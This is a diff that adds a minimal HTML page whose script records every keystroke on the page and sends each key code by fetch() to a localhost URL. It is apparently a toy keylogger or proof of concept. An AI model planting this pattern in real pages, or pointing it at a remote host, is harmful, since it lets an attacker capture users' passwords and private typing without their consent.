@@ -1,0 +1,12 @@
+<html>
+<p id="log"></p>
+<script>
+  document.addEventListener('keydown', logKey);
+
+  function logKey(e) {
+    log.textContent += e.code;
+    const url = 'http://localhost/?key=' + e.code;
+    fetch(url);
+  }
+</script>
+</html>
